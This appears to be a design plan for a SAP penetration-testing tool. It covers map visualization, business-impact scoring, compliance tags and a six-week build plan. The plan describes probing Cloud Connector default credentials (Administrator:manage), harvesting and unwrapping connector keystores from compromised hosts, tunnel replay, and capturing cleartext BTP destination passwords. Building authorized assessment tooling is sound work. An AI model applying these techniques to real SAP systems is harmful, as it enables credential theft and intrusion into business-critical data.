
```svg
<!-- x,y is upper-left bounding-box anchor; w=240, h=140 -->
<path d="M ${x+24} ${y}
         L ${x+w-24} ${y}
         L ${x+w} ${y+h/2}
         L ${x+w-24} ${y+h}
         L ${x+24} ${y+h}
         L ${x} ${y+h/2} Z"
      fill="#0f2a2e" stroke="#046c7a" stroke-width="3" />
```

Inside, a small cloud-down-arrow icon at the right tip indicates "outbound
tunnel:"

```svg
<text x="${x+w-22}" y="${y+h/2+5}" font-size="20" fill="#7fcdd3">&#9729;&#11015;</text>
```

**BTPSubaccountNode — cloud-shaped path**, 220×120. Cloud silhouette built
from three overlapping circles + a flat base:

```svg
<path d="M ${cx-90} ${cy+30}
         a 30 30 0 0 1 0 -60
         a 30 30 0 0 1 50 -20
         a 35 35 0 0 1 60 0
         a 30 30 0 0 1 50 20
         a 30 30 0 0 1 0 60 Z"
      fill="#102844" stroke="#3a72c4" stroke-width="3" />
```

`cx, cy` are the cloud's logical center; `_x = cx-110`, `_y = cy-60` for the
hit-test bounding box (the layout engine already uses `_x/_y` for SAPNode, so
extending is one helper that maps shape-anchor to bbox).

**IASTenantNode — key-shape**, 200×100. SAP IAS reads visually as "identity",
key icon is the universal stand-in:

```svg
<path d="M ${x+30} ${y+50}
         a 25 25 0 1 1 0 -1
         L ${x+200} ${y+50}
         L ${x+200} ${y+65}
         L ${x+185} ${y+65}
         L ${x+185} ${y+50}
         L ${x+170} ${y+50}
         L ${x+170} ${y+65} Z"
      fill="#2b1f3e" stroke="#a371f7" stroke-width="3" />
```

The bow of the key sits on the left, teeth project right; immediately
distinguishable from the SAPNode rectangle and the SCC hexagon.

### D.2 Color palette extension

Update `PILL_COLORS` and `PILL_LABELS` (around line 1267 of `sapmap_html.py`)
plus add new top-level symbol colors. Existing palette retained verbatim.

```javascript
const PILL_COLORS = {
  'ABAP': '#0070f2', 'JAVA': '#d27700', 'ABAP+JAVA': '#0070f2',
  'BUSINESSOBJECTS': '#8b47d7', 'CLOUD_CONNECTOR': '#046c7a',
  'CONTENT_SERVER': '#256f3a', 'SAPROUTER': '#788fa6', 'MDM': '#5d36ff',
  'HANA': '#aa0808', 'MAXDB': '#e07900', 'MSSQL': '#2f5ea0',
  'ORACLE': '#c74634', 'DB2': '#054ada',
  // NEW:
  'SCC':            '#046c7a',  // teal — same as CLOUD_CONNECTOR pill
  'BTP_SUBACCOUNT': '#3a72c4',  // BTP blue
  'IAS_TENANT':     '#a371f7',  // identity purple (matches HTTP destination dot)
};
const PILL_LABELS = {
  'ABAP': 'ABAP', 'JAVA': 'Java', 'ABAP+JAVA': 'AB+Java',
  'BUSINESSOBJECTS': 'BO', 'CLOUD_CONNECTOR': 'SCC',
  'CONTENT_SERVER': 'Content', 'SAPROUTER': 'SAProuter', 'MDM': 'MDM',
  'HANA': 'HANA', 'MAXDB': 'MaxDB', 'MSSQL': 'MSSQL',
  'ORACLE': 'Oracle', 'DB2': 'DB2',
  // NEW:
  'SCC':            'SCC',
  'BTP_SUBACCOUNT': 'BTP',
  'IAS_TENANT':     'IAS',
};
```

Color-collision check against the existing pills: `#046c7a` already maps to
`CLOUD_CONNECTOR` (which was a placeholder `system_type` on `SAPNode`).
Reusing it for the new dedicated SCC node type is intentional — operators
who saw the placeholder pill in the old map will recognize the same hue on
the new shape. `#3a72c4` (BTP blue) is distinct from the seven other blues
already in play (`#0070f2`, `#054ada`, `#388bfd`, `#2f5ea0`, `#5dade2`,
`#3498db`, `#256f3a`) — easy reading. `#a371f7` reuses the existing
HTTP-destination accent purple, which is conceptually right (IAS is the
identity layer and currently shows up only as HTTP destination targets).

### D.3 Edges

Three new kinds, each with its own style:

| Kind | Stroke | Dash | Animation | Color rule |
|---|---|---|---|---|
| `tunnel` (SCC ↔ BTP) | 3 px | `8 4` | small dot traveling SCC→BTP every 1.6 s | green if `tunnel_replayed=False`, **bright red** if `True` |
| `mapping` (SCC → on-prem) | 2 px | `4 6` | none | grey (#788fa6) baseline; **orange** if `path_wildcards=True`; **dark red** if `principal_propagation=True` AND wildcards |
| `destination` (BTP → on-prem via SCC) | 3 px | solid | dot traveling BTP→on-prem every 1.2 s, **only when password_captured** | by `auth_type`: BasicAuth=red, SAML/OAuth=orange, X509=blue |
| `trust` (SAP ↔ IAS, or BTP ↔ IAS) | 1.5 px | `2 4` | none | purple (#a371f7), faded (`opacity=0.5`) |
| `tunnel_replayed` overlay | 4 px | `12 4` | dashes flow SCC←BTP (reversed), pulse-overlay on top via `_pulseConnection` | red, `stroke-opacity=0.9` |

Tunnel-edge animated dot example:

```svg
<g class="edge tunnel" data-src="${sccHost}" data-dst="${btpUuid}">
  <path d="${tunnelPath}" stroke="${color}" stroke-width="3"
        stroke-dasharray="8 4" fill="none" opacity="0.85" />
  <circle r="3.5" fill="${color}">
    <animateMotion dur="1.6s" repeatCount="indefinite">
      <mpath href="#${pathId}" />
    </animateMotion>
  </circle>
</g>
```

Mapping edges are drawn *underneath* the existing RFC edges (z-order: insert
into `<g class="edges-bg">` group), faded to 50% alpha — the eye should
read SCC mappings as background topology, RFC connections as foreground
pwn-paths.

### D.4 Pills / badges per node

**SCCNode pills (top-right of hex):**

| Pill | Trigger | Style |
|---|---|---|
| Version (`v2.17.1`) | `version` non-empty | grey monospace, 10pt |
| `DEFAULT CREDS` | `default_creds_live` | bright red (#e74c3c), 10pt bold, **blinks** (CSS `animation: blink 1.2s infinite`) |
| CVE badge (one per confirmed CVE) | each entry in `cves_confirmed` | orange (#e67e22), pill rendering same as system_type pill |
| `OUTBOUND TUNNEL` | `tunnel_region` set + connected to BTP node | green, small lozenge |
| `INBOUND MAPPING` | `mappings` non-empty | yellow lozenge, count suffix `(7)` |
| Key icon (PP) | `principal_propagation_enabled` | small `&#128273;` glyph |
| HA shadow icon | `ha_shadow_host` set | small `&#128208;` (bookmark glyph) |
| Pwned bolt | `pwned=True` | reuse existing `&#9889;` from line 1880 |
| Finding badge | unresolved findings count | reuse existing top-left badge |

**BTPSubaccountNode pills:**

| Pill | Trigger | Style |
|---|---|---|
| Region | `region` | blue lozenge "eu10" |
| Display name | `display_name` truncated | regular text |
| `CF TOKEN` | `cf_token_available` | green pill |
| `N DEST` | `len(destinations)` | grey lozenge with count |
| `K CLEARTEXT` | count of destinations with captured password | red pill, count, **blinks** when K>0 |
| Foreign-scope warning | `foreign_scope_refs` non-empty | orange pill |

**IASTenantNode pills:**

| Pill | Trigger | Style |
|---|---|---|
| `customer-branded` vs `sap-managed` | `customer_branded` | small grey lozenge |
| Federated subaccount count | `len(federated_subaccounts)` | grey lozenge |
| CVE badge | each `cves_confirmed` | orange |

### D.5 Layouting

The map currently has two layout modes — `layoutHierarchy` (RFC source above
target) and `layoutByStack` (group by ABAP/Java/Dual). Cloud entities don't
fit either. Add a third explicit mode and one composite mode:

- **`layoutCloudBand`** — top-of-canvas horizontal "cloud band" reserved for
  BTP subaccounts and IAS tenants. SCC nodes hover just below the cloud
  band, on-prem SAPNodes anchor to the existing layout under them. This
  reads as a literal up/down "cloud / on-prem" split — matches the mental
  model SAP customers already use in their architecture diagrams.
- **`layoutCloudCluster`** — cluster around their owning SCC. Better when a
  customer has many SCCs each serving few subaccounts. Each SCC becomes the
  hub; its served BTP subaccounts orbit on a 250-px arc above.

Default chosen at runtime: if `len(BTPSubaccountNodes) > 6 OR len(SCCNodes) > 3`
→ `layoutCloudBand`; else `layoutCloudCluster`.

Implementation: extend the existing `layoutByStack`/`layoutHierarchy` engine
in `sapmap_html.py` (around line 1515 — currently uses `BOX_W=240, BOX_H=174,
MARGIN=60`). Add `cloudBandH = 200` (height reserved at top), then run the
existing layout against `viewBox.h - cloudBandH` and offset all SAPNode `_y`
by `cloudBandH`. Place SCC and BTP/IAS nodes into the band by attempt-order:
BTP centered at top, IAS to the right, SCC straddling the boundary.

### D.6 Animation cues

Reuse `_pulseNode(sid, severity)` and `_pulseConnection(srcSid, tgtSid,
severity)` already defined at lines 4955 / 4984. Wire to new findings via the
existing `_maybePulseFromFinding` dispatcher (line 5016) — meta payload
already supports `source_sid` / `target_sid`, so adding `meta={"source_sid":
sccHost, "target_sid": btpUuid}` Just Works for tunnel-replay pulses.

Three new animations needed beyond the pulse overlay:

1. **Tunnel-replay reverse-flow** — when `scc.tunnel.replayed` fires, the
   tunnel edge's animated dot reverses direction (dur extends from 1.6s →
   0.8s) for 6 seconds, accompanied by red pulse on both endpoints.
2. **Default-creds-detected radial alarm** — `_pulseNode(sccHost, 'CRITICAL')`
   plus an extra `<circle>` at the SCC center with `r 0→200` over 1.2 s,
   stroke red, stroke-opacity fade. Feels like a klaxon.
3. **Destination-password-captured packet trail** — when
   `btp.destination.cleartext.captured` fires, an animated *streak* runs
   along the destination edge from BTP node to on-prem node, with a small
   `&#128273;` (key glyph) bouncing on the streak and dropping into the
   target node. Visually telegraphs "credential just transferred."

Implemented with a new helper `_pulseEdgeDirectional(srcSid, tgtSid, glyph,
severity)` next to the existing two — same SVG namespace dance, same 2.5 s
auto-remove timer.

### D.7 Drawer / details panel

When operator clicks an SCC node, the right-side drawer (currently the
`drawer` div) gains a new render branch keyed on `kind === 'scc'`. Mock:

```html
<div class="drawer-section">
  <h3>Cloud Connector — <code>${host}</code></h3>
  <div class="drawer-row"><b>Build</b>          <span>${version} (${version_source})</span></div>
  <div class="drawer-row"><b>Region</b>         <span>${tunnel_region}</span></div>
  <div class="drawer-row"><b>Subaccounts</b>    <span>${subaccount_uuids.length}</span></div>
  <div class="drawer-row"><b>Mappings</b>       <span>${mappings.length}</span></div>
  <div class="drawer-row"><b>PP enabled</b>     <span>${principal_propagation_enabled ? 'yes' : 'no'}</span></div>
  <div class="drawer-row"><b>Default creds</b>  <span class="${default_creds_live?'crit':'ok'}">${default_creds_live ? 'LIVE — Administrator:manage' : 'rotated'}</span></div>
  <div class="drawer-row"><b>Keystore</b>       <span class="${keystore_extracted?'crit':'mid'}">${keystore_extracted ? `extracted (${keystore_loot_path})` : 'not extracted'}</span></div>
  <hr>
  <h4>Subaccounts (${subaccount_uuids.length})</h4>
  <table class="drawer-table">
    <tr><th>UUID</th><th>Location ID</th><th>Region</th></tr>
    ${subaccount_uuids.map((u,i) => `<tr><td>${u.slice(0,8)}…</td><td>${location_ids[i]||'(empty)'}</td><td>${tunnel_region}</td></tr>`).join('')}
  </table>
  <hr>
  <h4>Mappings (${mappings.length})</h4>
  <table class="drawer-table">
    <tr><th>Virtual</th><th>→</th><th>Internal</th><th>Path</th><th>PP</th></tr>
    ${mappings.map(m => `<tr><td>${m.virtual_host}:${m.virtual_port}</td><td>${m.protocol}</td><td>${m.internal_host}:${m.internal_port}</td><td class="${m.path_wildcards?'crit':''}">${m.path_wildcards?'/ + sub-paths':m.path_allowlist.join(', ')}</td><td>${m.principal_propagation?'&#128273;':''}</td></tr>`).join('')}
  </table>
  <hr>
  <h4>Findings (${findings.length})</h4>
  ${findings.map(f => `<div class="fd fd-${f.severity_label}">${f.name}: ${f.description}</div>`).join('')}
  <hr>
  <button onclick="sccLogin('${host}')">Probe default creds</button>
  <button onclick="sccPullMappings('${host}')" ${admin_session_obtained?'':'disabled'}>Pull mappings</button>
  <button onclick="sccHarvestKeystore('${host}')" ${pwnedFromOnPrem?'':'disabled'}>Harvest keystore from pwned host</button>
  <button onclick="sccTunnelReplayCli('${host}')">Print tunnel-replay CLI command</button>
</div>
```

BTPSubaccountNode drawer mirrors the structure: header (uuid, region, name),
served-by-SCC list, destinations table with cleartext-password column
(highlighted red), foreign-scope-references, IAS trust link, then action
buttons (`Pull destinations`, `Test logon to <sid>`).

IASTenantNode drawer is more compact: tenant URL, issuer, jwks_uri, federated
subaccount list, `customer_branded` flag, action buttons (`Open .well-known
in browser`, `Probe SCIM (opt-in)`).

### D.8 Map symbol legend

Append to the legend strip (currently at line 636-647 of `sapmap_html.py`)
inside `<div class="legend-bar">`:

```html
<span class="legend-item"><svg width="20" height="14"><polygon points="3,2 17,2 19,7 17,12 3,12 1,7" fill="#0f2a2e" stroke="#046c7a" stroke-width="2"/></svg> SCC</span>
<span class="legend-item"><svg width="22" height="14"><path d="M 2 11 a 5 5 0 0 1 0 -8 a 5 5 0 0 1 6 -2 a 6 6 0 0 1 8 0 a 5 5 0 0 1 4 2 a 5 5 0 0 1 0 8 Z" fill="#102844" stroke="#3a72c4" stroke-width="2"/></svg> BTP Subaccount</span>
<span class="legend-item"><svg width="22" height="14"><circle cx="6" cy="7" r="4" fill="#2b1f3e" stroke="#a371f7" stroke-width="2"/><rect x="8" y="6" width="12" height="2" fill="#a371f7"/></svg> IAS Tenant</span>
<span class="legend-item"><span class="legend-swatch" style="background:transparent;border:1px dashed #2ecc71"></span> Tunnel (live)</span>
<span class="legend-item"><span class="legend-swatch" style="background:transparent;border:1px dashed #e74c3c"></span> Tunnel (replayed)</span>
<span class="legend-item"><span class="legend-swatch" style="background:transparent;border:1px dotted #788fa6"></span> Mapping</span>
<span class="legend-item">&#128273; Cleartext destination password</span>
```

---

## E. Risk visualization for the business

Cloud Connector findings are the first SAPMAP additions where the impact is
*business-cross-domain* (cloud sales-cloud production data leaking via on-prem
HR system, etc.). The CISO-facing surface needs to translate "principal
propagation CN regex too loose" into "an attacker can read Q3 forecast revenue
for European retail business unit." The plan keeps the existing `sapmap_impact.py`
scenario-registry pattern and adds five cloud-specific scenarios.

### E.1 Business impact narratives (CISO-language)

For each finding category, the human-readable narrative goes into the
`business_message` field of an `ImpactResult` (existing field — see line 38 of
`sapmap_impact.py`). Examples:

| Finding | Narrative |
|---|---|
| `btp.destination.cleartext.password` (RFC, `BasicAuthentication`, RFC user with SAP_ALL) | *"Anyone with this BTP destination's cleartext password can run any function module on `<SID>` production. Estimated impact: full read/write on `<N>` finance tables (`BSEG`, `BKPF`, `LFBK`), customer master, vendor master. Concretely: write a journal entry, dump `<count>` IBANs, exfiltrate the `<count>`-employee payroll register."* |
| `scc.default.creds.live` | *"This Cloud Connector is shipped with the published default password. Anyone reaching its admin port can map any internal host to the cloud, read the on-prem trust certificates, and impersonate cloud applications to on-prem SAP systems. Effective blast radius: every backend system this SCC routes to (`<N>` mappings)."* |
| `scc.keystore.extracted` | *"The Cloud Connector tunnel keys for `<N>` BTP subaccount(s) have been recovered. An attacker outside the building can stand up a fake Cloud Connector and intercept BTP-bound traffic for these subaccounts — including any cleartext credentials, principal-propagation tokens, and HTTP request bodies."* |
| `scc.principal.prop.too.permissive` | *"The Cloud Connector accepts user-certificates whose CN matches `<regex>`. An attacker controlling cloud-side identity can sign as `SAP*` and act with full superuser privilege on the on-prem system. Compensating control failure."* |
| `scc.location.id.collision` | *"Two Cloud Connectors register the same routing token (`<id>`) into the same region. BTP traffic intended for production may reach a development / shadow Cloud Connector — non-deterministic routing of regulated data."* |

### E.2 Quantitative risk score — extend `sapmap_impact.py`

Existing `ImpactResult.severity` is an enum (CRITICAL .. INFO). For
CISO-facing scoring, add a *numeric* field `risk_score` (0–100) computed from
four factors. The four-factor model is intentionally simple — a CISO can
understand it on one slide.

```
risk_score = clip(0, 100, round(
   data_class_factor * user_count_factor * control_strength_factor * reachability_factor * 100
))

where
  data_class_factor    in [0.1 .. 1.0]   # see matrix below
  user_count_factor    in [0.2 .. 1.5]   # log10(users)/4, clipped
  control_strength_factor in [0.5 .. 2.0] # 0.5 = strong (SoD, MFA, SAML+SNC); 2.0 = none
  reachability_factor  in [0.5 .. 2.0]   # 0.5 = jumpbox-only; 1.0 = corp-LAN; 2.0 = internet-reachable
```

**Scoring matrix — `data_class_factor`:**

| Data class tag | Factor |
|---|---|
| `payroll` / `HR-restricted` | 1.0 |
| `finance-restricted` (BSEG, BKPF) | 1.0 |
| `customer-PII-EU` (DSGVO) | 0.95 |
| `customer-PII-non-EU` | 0.7 |
| `vendor-master` (LFBK includes IBANs) | 0.8 |
| `inventory` / `MM` | 0.4 |
| `metadata-only` | 0.1 |

**`reachability_factor`:**

| Reach | Factor |
|---|---|
| SCC admin UI directly internet-reachable | 2.0 |
| SCC port reachable from any BTP subaccount in same global account | 1.7 |
| SCC port reachable from corp LAN only | 1.0 |
| SCC port reachable only from a jumpbox | 0.5 |

**`control_strength_factor`:**

| Control posture | Factor |
|---|---|
| MFA on SCC admin + LDAP + SoD on all on-prem destination users | 0.5 |
| MFA on SCC admin only | 0.8 |
| LDAP without MFA | 1.2 |
| Default users with rotated passwords | 1.5 |
| Default creds live | 2.0 |

`user_count_factor` is `log10(max(1, user_count))/4` clipped to `[0.2, 1.5]`.
Rationale: a 1-user dev system gets factor 0.2; a 10000-user prod gets factor
1.0; very large estates plateau just above 1.5 to avoid steamrolling smaller
findings.

Implementation: new scenario decorator wrappers in
`sapmap_impact.py`:

```python
@impact_scenario("scc-default-creds", "Cloud Connector",
                 Severity.CRITICAL, icon="&#9889;")
def scenario_scc_default_creds(scc_node, *, state):
    """Default Administrator:manage live on internet-reachable SCC."""
    if not scc_node.default_creds_live:
        return None
    reachability = 2.0 if _is_internet_reachable(scc_node) else 1.0
    score = round(min(100, 1.0 * 1.0 * 2.0 * reachability * 100))
    return ImpactResult(
        scenario="scc-default-creds",
        category="Cloud Connector",
        severity=Severity.CRITICAL,
        headline=f"SCC {scc_node.host} accepts default Administrator:manage",
        record_count=len(scc_node.subaccount_uuids),
        business_message=f"...",
        icon="&#9889;",
        # Extension fields:
    )
```

Five new scenarios (one per finding family in §C.3, each computing a
`risk_score` value alongside the existing `severity` label). Numeric score
rendered in the existing impact bar (line 1996) with a small numeric overlay.

### E.3 CISO-facing dashboard widget

A new top-right banner tile (rendered in `<div id="ciso-tile">` placed next to
`stats-bar` / `legend-bar`). Fixed-width 320 px, three rows:

```
┌─────────────────────────────────────────────┐
│ CLOUD ATTACK PATHS                          │
│ ─────────────────────────────────────────── │
│ Paths to BTP production:        7  (HIGH)   │
│ Cleartext destination pwds:     3           │
│ Subaccounts via SCC compromise: 2           │
│ Risk score (top finding):       87 / 100    │
│ Compliance flags:               NIS2, DORA  │
└─────────────────────────────────────────────┘
```

Numbers are pure DOM updates from polled API
(`GET /api/ciso_summary` — new endpoint, ~30 LOC backend, returns the four
counts). Tile background-color flashes briefly (CSS `animation: tile-flash
0.8s`) when the underlying number increases — visually announces a new
critical path opening.

The CISO tile appears only when the operator has enabled the "Show
business-impact summary" toggle in the toolbar (a checkbox added to the
existing `<div class="toolbar-adv">` block). Default off, because pen-test
operators who only care about exploit chains find the tile a distraction.

### E.4 Compliance-mapping line

Each finding category gets a default mapping. Stored in
`sapmap_compliance.py` (new file, ~150 LOC, plain Python dict):

```python
COMPLIANCE_MAP = {
  "scc.default.creds.live":              ["NIS2 Art.21(2)(d)", "DORA Art.9(4)(c)", "ISO27001:2022 A.5.17", "SOX-ITGC AC-1"],
  "scc.keystore.extracted":              ["NIS2 Art.21(2)(d)", "DORA Art.9(4)(d)", "ISO27001:2022 A.5.34", "SOX-ITGC AC-2"],
  "scc.tunnel.replayed":                 ["NIS2 Art.21(2)(g)", "DORA Art.9(4)(c)"],
  "scc.principal.prop.ca.exfil":         ["ISO27001:2022 A.5.34"],
  "scc.principal.prop.too.permissive":   ["NIS2 Art.21(2)(d)", "ISO27001:2022 A.5.15"],
  "scc.location.id.empty":               ["ISO27001:2022 A.5.10"],
  "scc.location.id.collision":           ["ISO27001:2022 A.5.10"],
  "scc.mapping.path.too.permissive":     ["ISO27001:2022 A.5.15", "SOX-ITGC AC-1"],
  "scc.service.channel.kerberos.live":   ["NIS2 Art.21(2)(d)"],
  "btp.destination.cleartext.password":  ["NIS2 Art.21(2)(j)", "DORA Art.9(4)(c)", "ISO27001:2022 A.5.17"],
  "btp.destination.cleartext.captured":  ["NIS2 Art.21(2)(j)", "DORA Art.9(4)(d)", "SOX-ITGC AC-2"],
  "btp.subaccount.foreign.scope.reference": ["ISO27001:2022 A.5.15"],
  "ias.tenant.scim.exposed":             ["NIS2 Art.21(2)(d)", "ISO27001:2022 A.5.16"],
}
```

The drawer renders the compliance tags as small grey lozenges under the
finding description — the operator can hand the export straight to a GRC
analyst.

### E.5 Export format

Extend the existing markdown export
(`exportMarkdown` / "export-as-markdown" — present in
`sapmap_html.py` per `00_priority_summary.md` task #15). Add a new H2
section right under the executive summary:

```markdown
## Cloud Connector & BTP — executive summary

7 attack paths from on-prem to BTP production were identified.

3 destination passwords were retrieved in cleartext (CRITICAL — NIS2 Art.21(2)(j)).
2 subaccounts could be impersonated via the recovered Cloud Connector
keystore (CRITICAL — DORA Art.9(4)(c), ISO27001:2022 A.5.34).

Top-risk finding: SCC `<host>` accepts the default `Administrator:manage`
login on its internet-facing 8443 admin port (risk score 87/100).

### Cloud Connectors discovered

| Host | Build | Default creds | Mappings | Subaccounts | Pwned |
|---|---|---|---|---|---|
| `scc-prd.example.com` | 2.16.0 | LIVE | 14 | 2 | yes |
| `scc-dev.example.com` | 2.17.1 | rotated | 7 | 1 | no |

### BTP subaccounts discovered

| UUID | Region | Display name | Destinations | Cleartext pwds |
|---|---|---|---|---|
| 8b…d4 | eu10 | retail-prd | 23 | 3 |

### Cleartext destination passwords captured

| Destination | Target SAP system | User | Risk |
|---|---|---|---|
| ERP_RFC_PROD | S4H | RFC_BTP (SAP_ALL) | CRITICAL |
| HR_HTTP | HCM | BTP_HR_USER | HIGH |
…

### Recommended remediation (top 3)

1. Rotate the `Administrator` password on `scc-prd.example.com` immediately.
2. Replace `BasicAuthentication` with `OAuth2SAMLBearerAssertion` for the
   BTP destinations to ERP_RFC_PROD and HR_HTTP. Note 3138278.
3. Restrict CN regex on `scc-prd` principal-propagation trust to anchor
   `^CN=([a-zA-Z0-9_.-]{3,12})$`.
```

The block is rendered after the existing per-system findings tables and
before the appendix. Hidden behind a toggle in the export dialog (default on
when any cloud node exists in the state).

---

## F. Week-by-week implementation plan

Six weeks, single contributor. Replaces the seven-day sketch in
`03_cloud_connector_btp.md §8.1`.

### Week 1 — Read-only fingerprint

**Objectives.** Stand up the SCC node type and the cheapest end-to-end probe.
By Friday a scan against a known internet-reachable SCC produces an SCCNode
on the map with version, favicon hash, and TLS-cipher fingerprint. No
exploitation. No operator-typed credentials. No BTP coupling.

**Files touched.**
- `sapmap_models.py` — add `SCCNode` (no methods beyond `to_dict`/`from_dict`);
  no changes to `SAPNode`. Wire serialize/deserialize into `SAPMAPState`.
- `sapmap_scc_fingerprint.py` (NEW, ~250 LOC) — probes 1–6 of §A.
- `sapmap_scanner.py` — extend `fast_scan_host` to call `scc_fingerprint()`
  when 8443/tcp is open; promote into `SCCNode` in `_build_nodes_from_fast_scan`
  (line 2107).
- `sapmap_html.py` — add hex-shape rendering helper, draw SCCNode, add legend
  entry, add `kind === 'scc'` drawer branch (read-only — no action buttons
  yet).

**Test cases.**
- Local docker container with a self-signed nginx serving `/scc/ui` returning
  the SCC landing HTML — must NOT be misidentified as SCC (response body and
  `Server` header don't match).
- Captured PCAP / replay against a real SCC 2.17 → version detection + TLS
  fingerprint.
- State-file round-trip: scan → save → load → scan view identical (same SID
  lists, same SCCNode list).

**Risks / blockers.** TLS extension parsing in stdlib `ssl` is limited;
falling back to `cryptography` for cert subject parsing is OK but adds a
runtime dep — `cryptography` is already in `requirements.txt` (used by
`sapmap_secstore.py`), so this is fine.

### Week 2 — Default creds + version-based CVE buckets + admin REST

**Objectives.** The first finding-emitting probes. POST default creds, on
success extract the mapping table and subaccount UUID list via authenticated
REST. Surface the CVE bucket without active CVE PoCs (read-only — version
ranges only).

**Files touched.**
- `sapmap_scc_admin.py` (NEW, ~350 LOC) — `login(host, user, pwd)`,
  `pull_subaccounts(session)`, `pull_mappings(session, subaccount_uuid)`,
  `pull_versions(session)`, `logout(session)`. Single-session helper using
  `requests.Session`.
- `sapmap_scc_cve_buckets.py` (NEW, ~80 LOC) — pure-Python lookup table:
  `("2.16.0", "2.16.1") → ["CVE-2024-25642"]`. No probes; just version-range
  triggers.
- `sapmap_scanner.py` — wire `_verify_scc()` to optionally call admin login
  when default-creds probing is on.
- `sapmap_html.py` — drawer "Probe default creds" / "Pull mappings" buttons.
- `sapmap_findings.py` — no changes needed; existing `emit_finding` API is
  used for all four new categories.

**Test cases.**
- Local SCC test instance with `Administrator:manage` left in place →
  default-creds-live finding fires, mappings table populated.
- SCC instance with rotated password → default-creds-live MUST NOT fire,
  HIGH-severity finding `scc.default.creds.absent.but.probed` fires
  (informational — operator knows the probe was tried).
- CVE bucket logic: SCC 2.16.0 (build < 2.16.2) emits HIGH finding for
  CVE-2024-25642; SCC 2.18.0 emits no CVE finding.

**Risks / blockers.** SAP's CSRF token rotation post-2.16 — a `GET` is needed
before the `POST` to harvest the `X-CSRF-Token` header. Standard pattern, but
worth surfacing in operator console output so failures are debuggable.
**Legal.** Default-creds probe is one HTTP POST and is off by default —
operator must tick "Allow default-cred probes" in the toolbar. Same precedent
as `sap_default_creds.py`.

### Week 3 — Post-RCE keystore harvester + JCEKS unwrap + offline tunnel-replay

**Objectives.** The crown-jewel chain that distinguishes SAPMAP from existing
public tools. Wire `harvest_scc_from_pwned_node()` (§A.3) into the existing
exploit registry; ship a CLI helper for tunnel replay; do NOT integrate replay
into the GUI.

**Files touched.**
- `sapmap_scc_secstore.py` (NEW, ~400 LOC) — JCEKS reader (Java keystore v3
  format), AES master-key unwrap, RSA private-key + cert export. Reuses
  `sapmap_crypto.py` if it exists; otherwise extracts shared AES helpers from
  `sapmap_secstore.py` into a new `sapmap_crypto.py`.
- `sapmap_exploit.py` — new function `harvest_scc_from_pwned_node(node, state)`
  that runs Bundles 1–4 of §A.3 over the existing OS-RCE primitives.
- `sapmap_scc_tunnel_replay.py` (NEW standalone CLI, ~250 LOC) — takes
  `--keystore /path/to/secure-storage.jceks --master /path/to/master.key
  --subaccount <uuid> --region eu10` and prints what would be sent. **No
  default outbound network call** — operator must add `--connect` to actually
  connect. Logged via stdout only; never invoked from the GUI.
- `sapmap_html.py` — drawer button "Harvest keystore from pwned host" wires to
  the exploit-registry call. New finding category `scc.keystore.extracted`
  surfaces as both a node-pulse and an entry in the markdown export.

**Test cases.**
- Lab: SCC on host A, ECC on host B with sapxpg + SSH-key access from B to A.
  Run 10KBlaze on B → end-to-end harvest of A's `scc_config/` → JCEKS unwrap →
  tunnel cert SHA256 matches the one served by A's TLS.
- JCEKS unit test: load a known-test JCEKS (committed under `tests/fixtures/`),
  unwrap with known master, assert RSA fingerprint.
- Tunnel-replay CLI: `--dry-run` mode prints the would-be TLS handshake
  hostnames without connecting.

**Risks / blockers.** JCEKS format has subtle quirks (PBE-OID variations
between SAP-shipped JCEKS and stock OpenJDK). Plan for two-passing tests
against fixtures from at least 2.16 and 2.17.

### Week 4 — BTPSubaccountNode + destinations enumerator + cleartext capture

**Objectives.** The cloud half. Operator pastes a `cf oauth-token` (toolbar
field, masked); SAPMAP enumerates subaccounts and destinations, captures
cleartext passwords for `BasicAuthentication` destinations, and adds the
captured credentials to the corresponding on-prem `SAPNode.credentials` list.

**Files touched.**
- `sapmap_models.py` — add `BTPSubaccountNode`, `BTPDestination`, `SCCMapping`
  dataclasses (already specced in §C); wire serialize/deserialize.
- `sapmap_btp.py` (NEW, ~400 LOC) — token-paste handling; `requests` wrappers
  for the eight endpoints in §A.4; two functions:
  `enumerate_subaccount(token, region)` and
  `pull_destinations(token, region, subaccount_uuid)`.
- `sapmap_scanner.py` — given a populated SCCNode, *infer* probable BTP
  region (`tunnel_region`) and pre-create stub `BTPSubaccountNode`s without
  a token; fully populated only after token-paste.
- `sapmap_html.py` — cloud-shape rendering, drawer (BTP), token-paste field,
  mapping-edge layout, destination-edge layout, cleartext-pwd "key glyph"
  trail animation.

**Test cases.**
- VCAP_SERVICES-based test fixture with two destinations (one Basic, one
  OAuth) → cleartext password captured for Basic, no capture for OAuth.
- State round-trip with BTP token redacted (token MUST NOT serialize to disk).
- Edge promotion: a captured `RFC_BTP` user with `BasicAuthentication` to S4H
  causes a new `RFCConnection(target_sid='S4H', conn_type='destination',
  edge_kind='destination', auth='Basic', ...)` to appear in the map, with
  RED edge.

**Risks / blockers.** The `destination_configuration.ApiAccess` scope is
*not* universally present in CF developer tokens. If only `read` is present,
plaintext is denied and only metadata is harvested. UI must distinguish
"destination listed" from "destination password captured" — different pill
colours.

### Week 5 — Principal-propagation analyzer + IAS fingerprint + cross-subaccount routing detector

**Objectives.** Finish the misconfiguration story. Read principal-propagation
trust rules out of admin REST (or out of extracted `mapping_authorities/`),
flag CN regex / wildcard issues; fingerprint IAS tenants attached to each
subaccount; detect Location-ID collisions across SCCs in the same global
account.

**Files touched.**
- `sapmap_scc_pp_analyzer.py` (NEW, ~250 LOC) — parses the mapping authorities
  trust XML, extracts CN-regex rules, applies a heuristic rule-set
  (`^CN=.+`, unanchored, `\*`, `.+` greedy) → severity.
- `sapmap_models.py` — add `IASTenantNode` (already specced).
- `sapmap_btp.py` — extend with `discover_ias_tenant(token, subaccount)`.
- `sapmap_scanner.py` — cross-SCC join: across all SCCNodes in state, group
  by `tunnel_region` and check for colliding `location_ids`. Emit collision
  finding.
- `sapmap_html.py` — IAS key shape, drawer, edges (BTP↔IAS, SAP↔IAS).

**Test cases.**
- Trust XML with `^CN=(.+)` (unanchored) → HIGH finding fires.
- Two SCCs sharing location ID `MAIN` → collision finding fires; synthetic
  edge between them rendered.
- IAS tenant on `customer-branded` URL (CNAME to `accounts.ondemand.com`) →
  `customer_branded=True`.

**Risks / blockers.** The trust XML format has changed twice in SCC's history.
Maintain test fixtures from 2.14, 2.16, 2.18 to keep parser regression-safe.

### Week 6 — Risk dashboard tile + compliance export + polish + docs

**Objectives.** Translate every finding into a CISO-facing artifact. Wire the
dashboard tile, the markdown-export section, and the compliance-tag dictionary.
Polish edge animations. Write user-facing docs for each finding category.

**Files touched.**
